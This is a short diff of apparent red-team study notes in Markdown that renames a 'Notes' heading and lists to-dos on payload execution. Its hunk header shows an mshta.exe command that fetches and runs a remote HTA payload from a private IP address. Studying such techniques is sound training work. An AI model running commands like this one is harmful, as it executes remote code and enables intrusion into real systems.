@@ -68,7 +68,7 @@ mshta.exe http://10.254.252.3:8000/app.hta
 Link to Heading
 and create 2 - Payloads & Execution Tech 
 
-#### Notes
+#### Notes | Bonus
 - Create Links
 - Bonus RT Sections 
 	- Learn to deploy payload without RDP 
